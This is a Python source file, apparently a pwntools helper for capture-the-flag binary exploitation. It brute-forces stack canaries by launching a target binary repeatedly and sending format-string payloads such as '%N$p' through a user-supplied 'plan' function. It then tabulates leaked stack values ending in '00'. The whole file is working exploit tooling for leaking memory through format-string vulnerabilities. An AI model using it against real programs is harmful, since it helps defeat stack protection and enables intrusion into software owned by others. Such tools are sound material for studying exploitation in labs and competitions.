from pwn import log, process, ELF
# from colorama import Fore, Back, Style
from tabulate import tabulate
from time import sleep


class Find:
    def __init__(self, decode: bool = True, verbose: bool = False):
        self.decode = decode
        self.res: list[list] = []
        self.verbose = verbose

    def check(self):
        """check
            check for invalid options
        Returns:
            error or None
        """
        pass


class FindInObjects(Find):
    def __init__(self, ouputs:list|set, decode: bool = True, verbose: bool = False):
        """FindInObjects

        Args:
            ouputs (list): list of objects
        """
        self.outputs = ouputs
        super().__init__(decode, verbose)

    def start(self):
        self.check()
        self.res = []
        header = ["index", "value"]

        for index, value in enumerate(self.outputs):
            if type(value).__name__ == "bytes" and self.decode:
                value = value.decode("utf-8")
            else:
                return log.error("if decode is true list elements must be bytes")
            if value.endswith("00"):
                self.res.append([index + 1, value])

        if self.verbose:
            table = tabulate(self.res, headers=header, tablefmt="grid")
            log.warning(f"find [{len(self.res)}] objects of [{len(self.outputs)}]")
            print(table)

        return self.res


class FindByPlan(Find):
    """FindByPlan
    find canary with plan (exploit function)
    """

    def __init__(
        self,
        file: str,
        plan,
        format: str = "p",
        start: int = 1,
        stop: int = 50,
        sleep: float = 0,
        leak: int = 1,
        lines: int = 1,
        recv: bool = False,
        until: str = "",
        table: bool = True,
        verbose: bool = False,
        **kwargs,
    ):
        """FindByPlane

        Args:
            file (str): filename toexploit
            plan (function): function to f-string vuln
            start (int, optional): start range. Defaults to 1.
            stop (int, optional): end range. Defaults to 50.
            sleep (float, optional): sleep beetwen each process. Defaults to 0.
            decode (bool, optional): decode recvs. Defaults to True.
            leak (int, optional): number of %p. Defaults to 1.
            lines (int, optional): number of recvlines ; last line is memmory addresses. Defaults to 1.
            recv (bool, optional): use recv if True (use recvline or recvuntil if False) Defaults to False.
            until (str, optional): use recvuntil if True Defaults to ""
            verbose (bool, optional): verbose mode. Defaults to False.
        """
        self.startRange = start
        self.sleep = sleep
        self.plan = plan
        self.file = file
        self.leak = leak
        if leak > 1:
            self.stopRange = stop // leak
        else:
            self.stopRange = stop
        self.format = format
        self.lines = lines
        self.recv = recv
        self.until = until
        self.table = table
        self.outputs = []
        super().__init__(False, verbose)

    def check(self):
        valids = ["p", "x"]
        if self.format not in valids:
            return log.error(f"invalid format")
        super().check()

    def mkPayload(self, num) -> str:
        if self.leak == 1:
            return f"%{num}${self.format}"
        if self.leak > 1:
            payload = ""
            for i in range(1, self.leak + 1):
                index = (self.leak * num - (self.leak - 1)) + i - 1
                payload += f"%{index}${self.format}{'|' if i != self.leak else ''}"
            return payload
        return ""

    def start(self):
        self.check()
        if self.verbose:
            log.warning("verbose mode is on")
        leak = self.leak
        header = ["index", "value"]
        for i in range(self.startRange, self.stopRange+1):
            pr = process(self.file)
            self.plan(pr)
            befor = pr.clean()
            if self.verbose and leak == 1:
                log.warning(f"befor send ({i}):\n {befor}")

            if self.verbose and leak > 1:
                log.warning(
                    f"befor send ({', '.join([str(leak*i-(leak-j)+1) for j in range(leak)])}):\n {befor}"
                )

            payload = self.mkPayload(i)
            pr.sendline(payload.encode())
            if self.lines > 1:
                out = pr.recvlines(self.lines)[-1]

            elif self.recv:
                out = pr.recv()

            elif self.until:
                out = pr.recvuntil(self.until.encode())

            else:
                out = pr.recvline()

            out = out.decode("utf-8").strip()
            if leak == 1:
                if out.endswith("00"):
                    self.outputs.append((i, out))

            else:
                out = out.split("|")
                for j in range(len(out)):
                    if out[j].endswith("00"):
                        if j == leak:
                            self.outputs.append((i * leak, out[j]))
                        else:
                            self.outputs.append((i * leak - leak + j + 1, out[j]))
            pr.close()
            sleep(self.sleep)

        if self.verbose or self.table:
            table = tabulate(self.outputs, headers=header, tablefmt="grid")
            print(table)
        if self.verbose:
            log.warning(f"found {len(self.outputs)} objects")

        return self.outputs
